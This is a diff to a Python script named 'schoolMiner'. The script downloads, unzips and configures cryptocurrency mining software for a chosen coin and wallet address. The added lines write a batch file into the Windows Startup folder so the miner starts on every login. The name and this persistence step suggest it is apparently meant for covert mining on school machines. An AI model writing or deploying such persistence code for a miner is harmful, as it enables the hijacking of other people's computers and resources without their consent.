@@ -2,7 +2,9 @@
 from download_miner import download
 from unzip import unzip
 from get_architecture import get_architecture
-
+from configure_miner import configure
+from os import chdir, getlogin
+from platform import system as os
 print("Welcome to schoolMiner\n"
       "Which coin you want to mine?\n"
       "Available Coins:\n"
@@ -21,6 +23,17 @@ elif coin == "ETH": # Ethereum can be mined only by GPU :(
     filename = download(coin, "GPU") 
 
 unzip(filename)
+addr = input("Enter your %s address: " % coin)
+if coin == "ETH":
+    configure(coin, "GPU", get_architecture(), addr)
 
-if filename.startswith('zec'):
-    
+else:
+    configure(coin, method, get_architecture(), addr)
+
+if os() == "Windows":
+    chdir(r'C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup' % getlogin())
+    xd = open("Miner.bat", "w", encoding="utf-8")
+    xd.write("C: \n")
+    xd.write("cd C:/Users/%s/miner \n" % getlogin())
+    xd.write("start start.bat")
+    xd.close()
